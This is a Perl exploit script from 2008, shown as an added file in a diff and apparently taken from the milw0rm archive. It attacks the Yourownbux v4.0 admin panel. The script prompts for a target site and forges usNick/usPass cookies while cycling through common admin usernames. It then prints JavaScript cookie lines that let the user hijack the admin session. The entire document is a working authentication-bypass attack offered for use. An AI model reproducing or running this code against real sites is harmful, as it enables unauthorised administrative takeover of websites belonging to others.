@@ -1,0 +1,135 @@
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+use HTTP::Request;
+
+#+-------------------------------------------------------------------------------------------------+-#
+#+ Yourownbux v4.0                   ------------------------------------------------------------+--+
+#+ Cookie Modification Exploit -----------------------------------------------------------------++
+#+ Discovered By: Tec-n0x | 04/9/2008 --------------------------------------------------------++
+#
+#+ Dropsec.com
+#
+#+ Modify The Line 39, Adding More User's that can be the admin username------------+
+#+
+# + Gr33tz: Celciuz, OzX, N.O.X, MurdeR, Syst3m-c0d3r && All Friends --++
+#+-------------------------------------------------------------+----------------------------------------#
+
+
+
+system("clear");
+
+print "
+# Yourownbux v4.0 Cookie Modification Exploit\n# Discovered By: Tec-n0x\n\n# Tec-n0x [ at ] hotmail [ dot ] com > DropSec.com 
+\n\n";
+print "Target [ Example: www.sitedemo.com ] :\n> ";
+$target = <STDIN>;
+chop($target);
+
+if($target =~ m/www\.(.*)\.(.*)/) {
+
+$other = $1;
+check1($target);
+
+} else {
+print "\nInvalid Target.";
+exit();
+}
+
+sub explote {
+
+@tryusers = ("admina", "administrator", "admins", "admin", "master", "manager", "root", "$other"); 
+# Add Posible Users.
+
+$check = shift;
+
+foreach $user (@tryusers) { 
+
+$pass = "Tec-n0x";
+
+print "\n\tTrying > $user\n";
+
+	$browser = LWP::UserAgent->new();
+	$browser->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14");
+	$browser->default_header("Cookie" => "usNick=$user; usPass=$pass");
+	$get = HTTP::Request->new(GET => $check);
+	$resp = $browser->request($get);
+	$content = $resp->content();
+
+@code = split("\n",$content);
+
+	foreach $checka (@code) {
+
+			if($checka =~ m/Emails|Served|Workload|Overview/) {
+
+system("clear");
+
+print "Succesfull EXPLOTED ...!!\n\nValid Username: $user\n\nGo to: $check\n\n And Put this on your browser:";
+
+$vd = "javascript\:document\.cookie = \"usNick=$user\; path=\/\"\;";
+$vda = "javascript\:document\.cookie = \"usPass=Dropsec\.com\; path=\/\"\;";
+
+print "
+
++------------------------------------+
++ $vd\n+ $vda
++------------------------------------+
+";
+
+
+$yes = 1;
+
+exit();
+
+}
+}
+}
+
+if($yes != 1) {
+
+print "\n\n\nExploit Failed";
+
+exit();
+
+}
+
+}
+sub check1 {
+
+$target = shift;
+
+$check = "http\:\/\/$target\/admin\/index\.php";
+
+	$browser = LWP::UserAgent->new();
+	$browser->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14");
+	$get = HTTP::Request->new(GET => $check);
+	$resp = $browser->request($get);
+	$content = $resp->content();
+
+@code = split("\n",$content);
+
+	foreach $checka (@code) {
+
+			if($checka =~ m/You must login as administrator to access this page/) {
+
+print "Check 1 [ OK ]\n";
+
+$success = 1;
+
+explote($check);
+
+} 
+
+}
+
+if($sucess != 1) {
+
+print "Failed";
+
+exit();
+
+}
+
+}
+
+# milw0rm.com [2008-09-11]
